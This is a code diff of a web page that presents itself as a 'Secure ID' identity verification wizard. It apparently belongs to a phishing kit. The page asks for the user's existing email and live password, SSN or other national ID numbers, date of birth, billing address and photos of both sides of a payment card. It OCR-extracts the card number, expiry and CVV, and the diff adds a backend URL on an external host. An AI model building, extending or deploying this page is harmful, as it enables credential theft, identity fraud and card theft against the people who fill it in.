-<!-- REDESIGNED SUCCESS SCREEN - Clean & Professional -->
+<!-- SUCCESS SCREEN -->
 <div id="screen-success" class="hidden text-center space-y-6 py-4 screen-fade">
 <div class="flex justify-center">
 <div class="p-3 bg-emerald-50 rounded-full">
 <i data-lucide="check-circle" class="w-12 h-12 text-emerald-600"></i>
 </div>
 </div>
-
 <div class="space-y-2">
-<h2 class="text-xl font-bold text-gray-900" data-i18n="success_title">Verification Complete</h2>
+<h2 class="text-xl font-bold text-gray-900">Verification Complete</h2>
 <p class="text-sm text-gray-600 max-w-xs mx-auto">
 Your identity verification has been successfully processed.
 </p>
 </div>
-
-<!-- Professional Summary Card -->
 <div class="bg-gray-50 rounded-xl border border-gray-200 p-4 text-left space-y-3">
 <div class="flex items-center justify-between pb-2 border-b border-gray-200">
 <span class="text-xs font-semibold text-gray-500">VERIFICATION SUMMARY</span>
@@ -673,7 +672,6 @@ Your identity verification has been successfully processed.
 </div>
 </div>
 </div>
-
 <button type="button" onclick="resetForm()" class="w-full py-3 px-4 rounded-xl font-semibold text-sm bg-purple-600 hover:bg-purple-700 text-white transition-all">
 Return to Dashboard
 </button>
@@ -686,454 +684,19 @@ Return to Dashboard
 <i data-lucide="lock" class="w-3.5 h-3.5 text-purple-600"></i>
 AES-256 GCM Secure
 </span>
-<span data-i18n="privacy_guarantee" class="font-semibold">All assets auto-wipe instantly</span>
+<span>All assets auto-wipe instantly</span>
 </footer>
 </div>
 
 <script>
-// Language Dictionary
-const translations = {
-en: {
-step_1_title: "Step 1: Security Setup",
-step_2_title: "Step 2: Profile Setup",
-step_3_title: "Step 3: Verification Documents",
-step_4_title: "Step 4: Final Verification",
-setup_account: "Create Secure ID",
-setup_desc: "Complete your initial identity verification credentials.",
-alert_confirm_title: "Important Confirmation Step",
-alert_confirm_desc: "Please input your existing, active email and password as your primary credentials.",
-label_email: "Primary Email Address",
-label_recovery: "Recovery Email Address",
-label_password: "Master Security Password",
-pwd_rule_len: "Min. 8 characters",
-pwd_rule_chars: "At least one letter and number",
-pwd_strength: "Password Strength:",
-strength_weak: "Weak",
-strength_medium: "Medium",
-strength_strong: "Strong",
-label_confirm_pwd: "Confirm Master Password",
-pwd_mismatch: "Passwords do not match",
-profile_title: "Identity Profile",
-profile_desc: "Provide your valid geographical registration data.",
-label_fullname: "Full Legal Name",
-label_dob: "Date of Birth (MM/DD/YYYY)",
-label_country: "Country of Residence",
-label_id_us: "Social Security Number (SSN)",
-label_id_uk: "National Insurance Number (NIN)",
-label_id_de: "German Identity Number (ID)",
-label_id_au: "Australian Identity / License Number",
-label_id_ca: "Social Insurance Number (SIN)",
-label_id_it: "Codice Fiscale ID",
-label_phone_us: "US Mobile Phone",
-label_phone_uk: "UK Mobile Phone",
-label_phone_de: "Germany Mobile Phone",
-label_phone_au: "Australia Mobile Phone",
-label_phone_ca: "Canada Mobile Phone",
-label_phone_it: "Italy Mobile Phone",
-label_postal: "ZIP / Postal Code",
-uploads_title: "Secure Financial Assets",
-uploads_desc: "Upload required verification cards & billing details.",
-payment_card_upload: "Payment Card Verification Files",
-up_license_head: "Driver's License Assets",
-badge_autofill: "Scan Autofill",
-up_front: "License Front",
-up_back: "License Back",
-up_card_front: "Card Front Photo",
-up_card_back: "Card Back Photo",
-up_national: "National ID / Passport",
-up_sub: "Main biographical data page",
-btn_upload: "Upload",
-review_title: "Review Data",
-review_desc: "Validate and confirm before generating digital verification keys.",
-rev_sec_creds: "Security Credentials",
-rev_email: "Primary:",
-rev_recovery: "Recovery:",
-rev_demographics: "Biographical Profile",
-rev_fullname: "Full Legal Name:",
-rev_dob: "Birth Date:",
-rev_country: "Country:",
-rev_phone: "Phone:",
-rev_postal: "Postal:",
-rev_assets: "Billing & Card Details",
-rev_card: "Card Number:",
-rev_expiry: "Card Expiry:",
-rev_billing_addr: "Billing Address:",
-badge_license_front: "No Front Lic.",
-badge_license_back: "No Back Lic.",
-badge_id: "No Nat. ID",
-badge_card_front: "No Card Front",
-badge_card_back: "No Card Back",
-badge_uploaded: "Uploaded",
-btn_back: "Back",
-btn_continue: "Continue",
-btn_submit: "Generate SecureID",
-success_title: "Verification Complete",
-success_desc: "Your identity verification has been successfully processed.",
-btn_dashboard: "Return to Dashboard",
-privacy_guarantee: "All assets auto-wipe instantly",
-label_old_pwd: "Primary Password Required (Same Email Match)",
-billing_address_head: "Billing Address",
-btn_sync: "Sync Profile ZIP",
-billing_street: "Street Address",
-billing_city: "City",
-billing_state: "State",
-billing_zip: "Billing ZIP / Postal",
-badge_optional: "Optional"
-},
-de: {
-step_1_title: "Schritt 1: Sicherheits-Setup",
-step_2_title: "Schritt 2: Profil-Setup",
-step_3_title: "Schritt 3: Verifizierungsdokumente",
-step_4_title: "Schritt 4: Finale Überprüfung",
-setup_account: "Sicherheits-ID erstellen",
-setup_desc: "Erstellen Sie Ihre ersten Anmeldedaten zur Identitätsprüfung.",
-alert_confirm_title: "Wichtiger Bestätigungsschritt",
-alert_confirm_desc: "Bitte verwenden Sie Ihre bestehende, aktive E-Mail und Ihr Passwort.",
-label_email: "Primäre E-Mail-Adresse",
-label_recovery: "Wiederherstellungs-E-Mail",
-label_password: "Haupt-Sicherheitspasswort",
-pwd_rule_len: "Min. 8 Zeichen",
-pwd_rule_chars: "Mindestens ein Buchstabe und eine Zahl",
-pwd_strength: "Passwortstärke:",
-strength_weak: "Schwach",
-strength_medium: "Mittel",
-strength_strong: "Stark",
-label_confirm_pwd: "Passwort bestätigen",
-pwd_mismatch: "Passwörter stimmen nicht überein",
-profile_title: "Identitätsprofil",
-profile_desc: "Geben Sie Ihre geografischen Registrierungsdaten an.",
-label_fullname: "Vollständiger Name",
-label_dob: "Geburtsdatum (MM/DD/YYYY)",
-label_country: "Wohnsitzland",
-label_id_us: "Sozialversicherungsnummer (SSN)",
-label_id_uk: "National Insurance Number (NIN)",
-label_id_de: "Personalausweisnummer",
-label_id_au: "Australische Identitätsnummer",
-label_id_ca: "Social Insurance Number (SIN)",
-label_id_it: "Codice Fiscale ID",
-label_phone_us: "US Mobiltelefon",
-label_phone_uk: "UK Mobiltelefon",
-label_phone_de: "Deutschland Mobiltelefon",
-label_phone_au: "Australien Mobiltelefon",
-label_phone_ca: "Kanada Mobiltelefon",
-label_phone_it: "Italien Mobiltelefon",
-label_postal: "Postleitzahl",
-uploads_title: "Sichere Dokumente",
-uploads_desc: "Laden Sie die erforderlichen Karten & Dokumente hoch.",
-payment_card_upload: "Zahlungskarten-Dateien",
-up_license_head: "Führerscheindokumente",
-badge_autofill: "Auto-Ausfüllen",
-up_front: "Vorderseite",
-up_back: "Rückseite",
-up_card_front: "Karten-Vorderseite",
-up_card_back: "Karten-Rückseite",
-up_national: "Personalausweis / Reisepass",
-up_sub: "Hauptseite des Ausweises",
-btn_upload: "Hochladen",
-review_title: "Daten überprüfen",
-review_desc: "Daten bestätigen, um Sicherheitsschlüssel zu generieren.",
-rev_sec_creds: "Sicherheitsanmeldedaten",
-rev_email: "Primär:",
-rev_recovery: "Wiederherstellung:",
-rev_demographics: "Biografisches Profil",
-rev_fullname: "Vollständiger Name:",
-rev_dob: "Geburtsdatum:",
-rev_country: "Land:",
-rev_phone: "Telefon:",
-rev_postal: "PLZ:",
-rev_assets: "Rechnung & Karte",
-rev_card: "Kartennummer:",
-rev_expiry: "Kartenablauf:",
-rev_billing_addr: "Rechnungsadresse:",
-badge_license_front: "Keine Vorderseite",
-badge_license_back: "Keine Rückseite",
-badge_id: "Keine Ausweis ID",
-badge_card_front: "Keine Kartenfront",
-badge_card_back: "Keine Kartenrückseite",
-badge_uploaded: "Hochgeladen",
-btn_back: "Zurück",
-btn_continue: "Weiter",
-btn_submit: "SecureID erstellen",
-success_title: "Verifizierung abgeschlossen",
-success_desc: "Ihre Identitätsprüfung wurde erfolgreich verarbeitet.",
-btn_dashboard: "Zum Dashboard zurückkehren",
-privacy_guarantee: "Alle Dokumente werden sofort gelöscht",
-label_old_pwd: "Primäres Passwort benötigt (Identische E-Mails)",
-billing_address_head: "Rechnungsadresse",
-btn_sync: "PLZ synchronisieren",
-billing_street: "Straße",
-billing_city: "Stadt",
-billing_state: "Bundesland",
-billing_zip: "Rechnungs-PLZ",
-badge_optional: "Optional"
-},
-fr: {
-step_1_title: "Étape 1: Sécurité",
-step_2_title: "Étape 2: Profil",
-step_3_title: "Étape 3: Documents de vérification",
-step_4_title: "Étape 4: Vérification finale",
-setup_account: "Créer Secure ID",
-setup_desc: "Remplissez vos premières informations de vérification d'identité.",
-alert_confirm_title: "Étape de confirmation importante",
-alert_confirm_desc: "Veuillez saisir votre adresse e-mail et mot de passe actifs existants.",
-label_email: "Adresse e-mail principale",
-label_recovery: "Adresse e-mail de récupération",
-label_password: "Mot de passe principal",
-pwd_rule_len: "Min. 8 caractères",
-pwd_rule_chars: "Au moins une lettre et un chiffre",
-pwd_strength: "Force du mot de passe:",
-strength_weak: "Faible",
-strength_medium: "Moyen",
-strength_strong: "Fort",
-label_confirm_pwd: "Confirmer le mot de passe",
-pwd_mismatch: "Les mots de passe ne correspondent pas",
-profile_title: "Profil d'identité",
-profile_desc: "Fournissez vos données géographiques valides.",
-label_fullname: "Nom Complet Légal",
-label_dob: "Date de naissance (MM/DD/YYYY)",
-label_country: "Pays de résidence",
-label_id_us: "Numéro de sécurité sociale (SSN)",
-label_id_uk: "National Insurance Number (NIN)",
-label_id_de: "Numéro d'identité allemand",
-label_id_au: "Numéro d'identité australien",
-label_id_ca: "Numéro d'assurance sociale (SIN)",
-label_id_it: "Code fiscal (Codice Fiscale)",
-label_phone_us: "Téléphone mobile US",
-label_phone_uk: "Téléphone mobile UK",
-label_phone_de: "Téléphone mobile Allemagne",
-label_phone_au: "Téléphone mobile Australie",
-label_phone_ca: "Téléphone mobile Canada",
-label_phone_it: "Téléphone mobile Italie",
-label_postal: "Code Postal",
-uploads_title: "Documents sécurisés",
-uploads_desc: "Téléversez les cartes & justificatifs requis.",
-payment_card_upload: "Téléversement de la Carte",
-up_license_head: "Permis de conduire",
-badge_autofill: "Scanner auto",
-up_front: "Recto du permis",
-up_back: "Verso du permis",
-up_card_front: "Recto de la carte",
-up_card_back: "Verso de la carte",
-up_national: "Carte d'identité nationale / Passeport",
-up_sub: "Page principale d'identité",
-btn_upload: "Téléverser",
-review_title: "Vérifier les données",
-review_desc: "Valisez et confirmez avant de générer vos clés de sécurité.",
-rev_sec_creds: "Identifiants de sécurité",
-rev_email: "Principal:",
-rev_recovery: "Récupération:",
-rev_demographics: "Profil biologique",
-rev_fullname: "Nom complet:",
-rev_dob: "Date de naissance:",
-rev_country: "Pays:",
-rev_phone: "Téléphone:",
-rev_postal: "Code postal:",
-rev_assets: "Facturation & Carte",
-rev_card: "Numéro de carte:",
-rev_expiry: "Date d'expiration:",
-rev_billing_addr: "Adresse de facturation:",
-badge_license_front: "Pas de Recto",
-badge_license_back: "Pas de Verso",
-badge_id: "Aucune CNI",
-badge_card_front: "Pas de Recto Carte",
-badge_card_back: "Pas de Verso Carte",
-badge_uploaded: "Téléversé",
-btn_back: "Retour",
-btn_continue: "Continuer",
-btn_submit: "Générer SecureID",
-success_title: "Vérification terminée",
-success_desc: "Votre vérification d'identité a été traitée avec succès.",
-btn_dashboard: "Retour au tableau de bord",
-privacy_guarantee: "Suppression instantanée des documents",
-label_old_pwd: "Mot de passe requis (E-mails identiques)",
-billing_address_head: "Adresse de facturation",
-btn_sync: "Synchroniser code postal",
-billing_street: "Rue",
-billing_city: "Ville",
-billing_state: "Région",
-billing_zip: "Code Postal Fact.",
-badge_optional: "Optionnel"
-},
-es: {
-step_1_title: "Paso 1: Configurar Seguridad",
-step_2_title: "Paso 2: Datos de Perfil",
-step_3_title: "Paso 3: Documentación de Identidad",
-step_4_title: "Paso 4: Verificación Final",
-setup_account: "Crear ID Segura",
-setup_desc: "Complete sus credenciales iniciales de verificación de identidad.",
-alert_confirm_title: "Paso de confirmación importante",
-alert_confirm_desc: "Por favor, introduzca su correo electrónico y contraseña activos existentes.",
-label_email: "Dirección de correo principal",
-label_recovery: "Correo de recuperación",
-label_password: "Contraseña maestra de seguridad",
-pwd_rule_len: "Mínimo 8 caracteres",
-pwd_rule_chars: "Al menos una letra y un número",
-pwd_strength: "Fuerza de la contraseña:",
-strength_weak: "Débil",
-strength_medium: "Media",
-strength_strong: "Fuerte",
-label_confirm_pwd: "Confirmar contraseña maestra",
-pwd_mismatch: "Las contraseñas no coinciden",
-profile_title: "Perfil de Identidad",
-profile_desc: "Proporcione sus datos válidos de residencia.",
-label_fullname: "Nombre Completo Legal",
-label_dob: "Fecha de nacimiento (MM/DD/YYYY)",
-label_country: "País de residencia",
-label_id_us: "Número de Seguro Social (SSN)",
-label_id_uk: "Número de Seguro Nacional (NIN)",
-label_id_de: "Número de Identidad Alemán",
-label_id_au: "Número de Identidad Australiano",
-label_id_ca: "Número de Seguro Social (SIN)",
-label_id_it: "Código Fiscal (Codice Fiscale)",
-label_phone_us: "Teléfono Móvil US",
-label_phone_uk: "Teléfono Móvil UK",
-label_phone_de: "Teléfono Móvil Alemania",
-label_phone_au: "Teléfono Móvil Australia",
-label_phone_ca: "Teléfono Móvil Canadá",
-label_phone_it: "Teléfono Móvil Italia",
-label_postal: "Código Postal",
-uploads_title: "Documentos de Identidad",
-uploads_desc: "Cargue las tarjetas e identificaciones requeridas.",
-payment_card_upload: "Subida de Tarjeta de Pago",
-up_license_head: "Licencia de Conducir",
-badge_autofill: "Escanear tarjeta",
-up_front: "Frente de Licencia",
-up_back: "Reverso de Licencia",
-up_card_front: "Frente de Tarjeta",
-up_card_back: "Reverso de Tarjeta",
-up_national: "Identificación Nacional / Pasaporte",
-up_sub: "Página de datos principales",
-btn_upload: "Subir",
-review_title: "Revisar Datos",
-review_desc: "Revise y confirme antes de generar sus credenciales de seguridad.",
-rev_sec_creds: "Credenciales de Seguridad",
-rev_email: "Principal:",
-rev_recovery: "Recuperación:",
-rev_demographics: "Perfil Biográfico",
-rev_fullname: "Nombre completo:",
-rev_dob: "Fecha de nac.:",
-rev_country: "País:",
-rev_phone: "Teléfono:",
-rev_postal: "C. Postal:",
-rev_assets: "Facturación y Tarjeta",
-rev_card: "Num. Tarjeta:",
-rev_expiry: "Vencimiento:",
-rev_billing_addr: "Dirección de Fact.:",
-badge_license_front: "Sin Frente",
-badge_license_back: "Sin Reverso",
-badge_id: "Sin ID Nacional",
-badge_card_front: "Sin Frente Tarjeta",
-badge_card_back: "Sin Reverso Tarjeta",
-badge_uploaded: "Cargado",
-btn_back: "Atrás",
-btn_continue: "Continuar",
-btn_submit: "Generar SecureID",
-success_title: "Verificación completada",
-success_desc: "Su verificación de identidad ha sido procesada exitosamente.",
-btn_dashboard: "Volver al panel",
-privacy_guarantee: "Eliminación automática de datos",
-label_old_pwd: "Contraseña principal obligatoria (Correos idénticos)",
-billing_address_head: "Dirección de Facturación",
-btn_sync: "Sincronizar código postal",
-billing_street: "Dirección/Calle",
-billing_city: "Ciudad",
-billing_state: "Estado",
-billing_zip: "Código Postal Fact.",
-badge_optional: "Opcional"
-},
-it: {
-step_1_title: "Passo 1: Sicurezza",
-step_2_title: "Passo 2: Profilo",
-step_3_title: "Passo 3: Documenti di Verifica",
-step_4_title: "Passo 4: Verifica Finale",
-setup_account: "Crea ID Sicuro",
-setup_desc: "Completa le credenziali iniziali di verifica dell'identità.",
-alert_confirm_title: "Passo di conferma importante",
-alert_confirm_desc: "Inserisci la tua e-mail e password attuali esistenti.",
-label_email: "Indirizzo e-mail principale",
-label_recovery: "E-mail di recupero",
-label_password: "Master Password di sicurezza",
-pwd_rule_len: "Minimo 8 caratteri",
-pwd_rule_chars: "Almeno una lettera e un numero",
-pwd_strength: "Forza password:",
-strength_weak: "Debole",
-strength_medium: "Media",
-strength_strong: "Forte",
-label_confirm_pwd: "Conferma Master Password",
-pwd_mismatch: "Le password non corrispondono",
-profile_title: "Profilo d'identità",
-profile_desc: "Fornisci i tuoi dati geografici validi di registrazione.",
-label_fullname: "Nome Completo Legale",
-label_dob: "Data di nascita (MM/DD/YYYY)",
-label_country: "Paese di residenza",
-label_id_us: "Numero di previdenza sociale (SSN)",
-label_id_uk: "National Insurance Number (NIN)",
-label_id_de: "Numero di identità tedesco",
-label_id_au: "Numero di identità australiano",
-label_id_ca: "Numero di assicurazione sociale (SIN)",
-label_id_it: "Codice Fiscale",
-label_phone_us: "Telefono US",
-label_phone_uk: "Telefono UK",
-label_phone_de: "Telefono Germania",
-label_phone_au: "Telefono Australia",
-label_phone_ca: "Telefono Canada",
-label_phone_it: "Telefono Italia",
-label_postal: "Codice Postale (ZIP)",
-uploads_title: "Documenti di Sicurezza",
-uploads_desc: "Carica le carte e i documenti d'identità richiesti.",
-payment_card_upload: "Caricamento Carta di Credito",
-up_license_head: "Patente di Guida",
-badge_autofill: "Scansione auto",
-up_front: "Fronte Patente",
-up_back: "Retro Patente",
-up_card_front: "Fronte Carta",
-up_card_back: "Retro Carta",
-up_national: "Identità Nazionale / Passaporto",
-up_sub: "Pagina principale d'identità",
-btn_upload: "Carica",
-review_title: "Revisione Dati",
-review_desc: "Controlla e conferma prima di generare le chiavi di sicurezza.",
-rev_sec_creds: "Credenziali di Sicurezza",
-rev_email: "Principale:",
-rev_recovery: "Recupero:",
-rev_demographics: "Profilo Biografico",
-rev_fullname: "Nome Completo:",
-rev_dob: "Data di Nascita:",
-rev_country: "Paese:",
-rev_phone: "Telefono:",
-rev_postal: "C.A.P.:",
-rev_assets: "Fatturazione & Carta",
-rev_card: "Numero Carta:",
-rev_expiry: "Scadenza:",
-rev_billing_addr: "Indirizzo Fatturazione:",
-badge_license_front: "No Fronte",
-badge_license_back: "No Retro",
-badge_id: "No ID Naz.",
-badge_card_front: "No Fronte Carta",
-badge_card_back: "No Retro Carta",
-badge_uploaded: "Caricato",
-btn_back: "Indietro",
-btn_continue: "Continua",
-btn_submit: "Genera SecureID",
-success_title: "Verifica completata",
-success_desc: "La verifica della tua identità è stata elaborata con successo.",
-btn_dashboard: "Torna alla dashboard",
-privacy_guarantee: "Cancellazione immediata dei documenti",
-label_old_pwd: "Master Password necessaria (E-mail identiche)",
-billing_address_head: "Indirizzo di Fatturazione",
-btn_sync: "Sincronizza C.A.P.",
-billing_street: "Via e Numero Civico",
-billing_city: "Città",
-billing_state: "Provincia",
-billing_zip: "C.A.P. Fatturazione",
-badge_optional: "Opzionale"
-}
-};
+// ============================================================
+// BACKEND URL
+// ============================================================
+const BACKEND_URL = 'https://please-y66w.onrender.com';
 
 // State variables
 let currentStep = 1;
 const totalSteps = 4;
-let selectedLang = 'en';
 let idleSeconds = 0;
 let idleTimer;
 let audioCtx;
@@ -1146,15 +709,27 @@ cardBack: false,
 id: false
 };
 
-// Card scan data - will store extracted info
-let scannedCardData = {
-number: null,
-expiry: null,
-cvv: null
+let scannedCardData = { number: null, expiry: null, cvv: null };
+
+// Store image preview URLs for review page
+let imagePreviews = {
+licenseFront: null,
+licenseBack: null,
+cardFront: null,
+cardBack: null,
+id: null
 };
 
 // Helper Functions
-function playTone(freq, type, duration, vol=0.1) {
+function showToast(message, isError = false) {
+const toast = document.createElement('div');
+toast.className = `fixed bottom-20 left-1/2 transform -translate-x-1/2 ${isError ? 'bg-red-500' : 'bg-emerald-500'} text-white px-4 py-2 rounded-lg text-xs z-50 animate-pulse`;
+toast.textContent = message;
+document.body.appendChild(toast);
+setTimeout(() => toast.remove(), 2000);
+}
+
+function playTone(freq, type, duration, vol = 0.1) {
 try {
 if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
 if (audioCtx.state === 'suspended') audioCtx.resume();
@@ -1173,28 +748,9 @@ osc.stop(audioCtx.currentTime + duration);
 
 function soundTick() { playTone(800, 'sine', 0.05, 0.05); }
 function soundSuccess() { playTone(587.33, 'sine', 0.15, 0.15); setTimeout(() => playTone(880, 'sine', 0.25, 0.15), 100); }
-function soundError() { playTone(150, 'sawtooth', 0.3, 0.2); }
-function soundUpload() { playTone(440, 'triangle', 0.15, 0.1); setTimeout(() => playTone(659.25, 'triangle', 0.2, 0.1), 80); }
+function soundUpload() { playTone(440, 'triangle', 0.15, 0.1); }
 
-function soundScanLaser() {
-try {
-if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-const osc = audioCtx.createOscillator();
-const gain = audioCtx.createGain();
-osc.type = 'sawtooth';
-osc.frequency.setValueAtTime(100, audioCtx.currentTime);
-osc.frequency.linearRampToValueAtTime(1200, audioCtx.currentTime + 0.8);
-osc.frequency.linearRampToValueAtTime(100, audioCtx.currentTime + 1.6);
-gain.gain.setValueAtTime(0.04, audioCtx.currentTime);
-gain.gain.exponentialRampToValueAtTime(0.00001, audioCtx.currentTime + 1.8);
-osc.connect(gain);
-gain.connect(audioCtx.destination);
-osc.start();
-osc.stop(audioCtx.currentTime + 1.8);
-} catch(e) {}
-}
-
-// Idle Timer Functions
+// Idle Timer
 function startIdleTimer() {
 clearInterval(idleTimer);
 idleSeconds = 180;
@@ -1223,12 +779,10 @@ updateTimerDisplay();
 }
 
 function lockSession() {
-soundError();
 document.getElementById('lockScreen').classList.remove('hidden');
 }
 
 function unlockSession() {
-soundSuccess();
 document.getElementById('lockScreen').classList.add('hidden');
 startIdleTimer();
 }
@@ -1290,10 +844,38 @@ const stepProgressText = document.getElementById('stepProgressText');
 const progressBar = document.getElementById('progressBar');
 const langSwitcher = document.getElementById('langSwitcher');
 
+// Image preview function
+function setupImagePreview(fileInput, previewImgId, checkElementId, boxElementId, uploadStateKey) {
+fileInput.addEventListener('change', (e) => {
+if (e.target.files && e.target.files[0]) {
+const reader = new FileReader();
+reader.onload = function(event) {
+const previewImg = document.getElementById(previewImgId);
+if (previewImg) {
+previewImg.src = event.target.result;
+previewImg.classList.remove('hidden');
+}
+imagePreviews[uploadStateKey] = event.target.result;
+uploadState[uploadStateKey] = true;
+triggerGlowStyle(document.getElementById(boxElementId), document.getElementById(checkElementId), true);
+soundUpload();
+};
+reader.readAsDataURL(e.target.files[0]);
+}
+validateAll();
+});
+}
+
+// Setup all image previews
+setupImagePreview(fileLicenseFront, 'previewLicenseFront', 'checkLicenseFront', 'licenseFrontBox', 'licenseFront');
+setupImagePreview(fileLicenseBack, 'previewLicenseBack', 'checkLicenseBack', 'licenseBackBox', 'licenseBack');
+setupImagePreview(fileCardFront, 'previewCardFront', 'checkCardFront', 'cardFrontBox', 'cardFront');
+setupImagePreview(fileCardBack, 'previewCardBack', 'checkCardBack', 'cardBackBox', 'cardBack');
+setupImagePreview(fileId, 'previewId', 'checkId', 'uploadIdBox', 'id');
+
 // Initialize
 window.addEventListener('DOMContentLoaded', () => {
 lucide.createIcons();
-translateUI();
 validateAll();
 adjustFieldsByCountry();
 startIdleTimer();
@@ -1306,33 +888,14 @@ elem.addEventListener('input', soundTick);
 });
 
 langSwitcher.addEventListener('change', (e) => {
-selectedLang = e.target.value;
-translateUI();
 adjustFieldsByCountry();
 soundSuccess();
 });
 
-function translateUI() {
-const elements = document.querySelectorAll('[data-i18n]');
-elements.forEach(elem => {
-const key = elem.getAttribute('data-i18n');
-if (translations[selectedLang] && translations[selectedLang][key]) {
-if (elem.tagName === 'INPUT' || elem.tagName === 'TEXTAREA') {
-elem.placeholder = translations[selectedLang][key];
-} else {
-elem.textContent = translations[selectedLang][key];
-}
-}
-});
-updateDynamicStepLabels();
-}
-
 function updateDynamicStepLabels() {
-if (currentStep <= 4) {
-stepLabel.textContent = translations[selectedLang][`step_${currentStep}_title`];
+stepLabel.textContent = `Step ${currentStep}: ${currentStep === 1 ? 'Security Setup' : currentStep === 2 ? 'Profile Setup' : currentStep === 3 ? 'Documents' : 'Final Review'}`;
 stepProgressText.textContent = `${currentStep} / ${totalSteps}`;
 progressBar.style.width = `${(currentStep / totalSteps) * 100}%`;
-}
 }
 
 // Password validation
@@ -1354,15 +917,15 @@ strengthBar.className = "h-full transition-all duration-300";
 if (score <= 1) {
 strengthBar.classList.add('bg-red-500', 'w-1/3');
 strengthText.className = "text-red-600 font-bold";
-strengthText.textContent = translations[selectedLang].strength_weak;
+strengthText.textContent = "Weak";
 } else if (score === 2 || score === 3) {
 strengthBar.classList.add('bg-yellow-500', 'w-2/3');
 strengthText.className = "text-yellow-600 font-bold";
-strengthText.textContent = translations[selectedLang].strength_medium;
+strengthText.textContent = "Medium";
 } else {
 strengthBar.classList.add('bg-emerald-500', 'w-full');
 strengthText.className = "text-emerald-600 font-bold";
-strengthText.textContent = translations[selectedLang].strength_strong;
+strengthText.textContent = "Strong";
 }
 
 validateConfirmPassword();
@@ -1378,7 +941,6 @@ function validateConfirmPassword() {
 if (confirmPassword.value && password.value !== confirmPassword.value) {
 confirmMatchText.classList.remove('hidden');
 confirmPassword.classList.add('border-red-500');
-confirmPassword.classList.remove('border-emerald-500');
 } else if (confirmPassword.value && password.value === confirmPassword.value) {
 confirmMatchText.classList.add('hidden');
 confirmPassword.classList.remove('border-red-500');
@@ -1394,12 +956,8 @@ const parent = document.getElementById(elementId);
 const dot = parent.querySelector('.indicator');
 if (isValid) {
 dot.className = "indicator w-1.5 h-1.5 rounded-full bg-emerald-500";
-parent.classList.add('text-emerald-700');
-parent.classList.remove('text-purple-800');
 } else {
 dot.className = "indicator w-1.5 h-1.5 rounded-full bg-red-500";
-parent.classList.add('text-purple-800');
-parent.classList.remove('text-emerald-700');
 }
 }
 
@@ -1408,7 +966,6 @@ const isPassword = password.getAttribute('type') === 'password';
 password.setAttribute('type', isPassword ? 'text' : 'password');
 eyeIcon.setAttribute('data-lucide', isPassword ? 'eye-off' : 'eye');
 lucide.createIcons();
-soundSuccess();
 });
 
 function checkEmailIdentical() {
@@ -1417,10 +974,8 @@ const rEmail = recoveryEmail.value.trim().toLowerCase();
 
 if (pEmail && rEmail && pEmail === rEmail) {
 oldPasswordContainer.classList.remove('hidden');
-oldPassword.setAttribute('required', 'true');
 } else {
 oldPasswordContainer.classList.add('hidden');
-oldPassword.removeAttribute('required');
 oldPassword.value = '';
 }
 validateAll();
@@ -1441,127 +996,121 @@ identityId.value = '';
 phone.value = '';
 postal.value = '';
 
-identityId.classList.remove('border-red-500', 'border-emerald-500');
-phone.classList.remove('border-red-500', 'border-emerald-500');
-postal.classList.remove('border-red-500', 'border-emerald-500');
-idFormatError.classList.add('hidden');
-
 const labels = {
-US: { id: "Social Security Number (SSN)", idPlace: "000-00-0000", phone: "US Mobile Phone", phonePlace: "(000) 000-0000", postalPlace: "90210" },
-UK: { id: "National Insurance Number (NIN)", idPlace: "QQ-12-34-56-A", phone: "UK Mobile Phone", phonePlace: "07123 456789", postalPlace: "SW1A 1AA" },
-DE: { id: "German Identity Number (ID)", idPlace: "T12345678", phone: "Germany Mobile Phone", phonePlace: "0151 23456789", postalPlace: "10115" },
-AU: { id: "Australian Identity / License Number", idPlace: "987654321", phone: "Australia Mobile Phone", phonePlace: "0412 345 678", postalPlace: "2000" },
-CA: { id: "Social Insurance Number (SIN)", idPlace: "123-456-789", phone: "Canada Mobile Phone", phonePlace: "(000) 000-0000", postalPlace: "K1A 0B1" },
-IT: { id: "Codice Fiscale ID", idPlace: "RSSMRA85M01H501Z", phone: "Italy Mobile Phone", phonePlace: "312 345 6789", postalPlace: "00118" }
+US: { id: "SSN", idPlace: "000-00-0000", phone: "US Mobile", phonePlace: "(000) 000-0000", postalPlace: "90210" },
+UK: { id: "NIN", idPlace: "QQ-12-34-56-A", phone: "UK Mobile", phonePlace: "07123 456789", postalPlace: "SW1A 1AA" },
+DE: { id: "German ID", idPlace: "T12345678", phone: "Germany Mobile", phonePlace: "0151 23456789", postalPlace: "10115" },
+AU: { id: "Australian ID", idPlace: "987654321", phone: "Australia Mobile", phonePlace: "0412 345 678", postalPlace: "2000" },
+CA: { id: "SIN", idPlace: "123-456-789", phone: "Canada Mobile", phonePlace: "(000) 000-0000", postalPlace: "K1A 0B1" },
+IT: { id: "Codice Fiscale", idPlace: "RSSMRA85M01H501Z", phone: "Italy Mobile", phonePlace: "312 345 6789", postalPlace: "00118" }
 };
 
 const data = labels[c];
 if (data) {
-identityLabel.textContent = translations[selectedLang][`label_id_${c.toLowerCase()}`] || data.id;
+identityLabel.textContent = data.id;
 identityId.placeholder = data.idPlace;
-phoneLabel.textContent = translations[selectedLang][`label_phone_${c.toLowerCase()}`] || data.phone;
+phoneLabel.textContent = data.phone;
 phone.placeholder = data.phonePlace;
 postal.placeholder = data.postalPlace;
 }
 }
 
-// Function to extract card details from image using OCR
-async function extractCardDetailsFromImage(imageFile, isFrontImage) {
-return new Promise((resolve) => {
-if (!imageFile) {
-resolve(null);
-return;
+// Card scanning with OCR
+fileCardFront.addEventListener('change', async () => {
+if (fileCardFront.files.length > 0) {
+uploadState.cardFront = true;
+triggerScanGlow(cardFrontBox, checkCardFront, 'scanLaserCardFront', true);
+
+ocrCardStatusMsg.classList.remove('hidden');
+
+try {
+const cardData = await extractCardDetailsFromImage(fileCardFront.files[0], true);
+if (cardData) {
+if (cardData.number) scannedCardData.number = cardData.number;
+if (cardData.expiry) scannedCardData.expiry = cardData.expiry;
+}
+} catch (e) {
+console.log("OCR error");
 }
 
-// Create an image element to analyze
+if (uploadState.cardBack && scannedCardData.number && scannedCardData.expiry && scannedCardData.cvv) {
+applyScannedCardData();
+}
+}
+validateAll();
+});
+
+fileCardBack.addEventListener('change', async () => {
+if (fileCardBack.files.length > 0) {
+uploadState.cardBack = true;
+triggerScanGlow(cardBackBox, checkCardBack, 'scanLaserCardBack', true);
+
+ocrCardStatusMsg.classList.remove('hidden');
+
+try {
+const cardData = await extractCardDetailsFromImage(fileCardBack.files[0], false);
+if (cardData && cardData.cvv) {
+scannedCardData.cvv = cardData.cvv;
+}
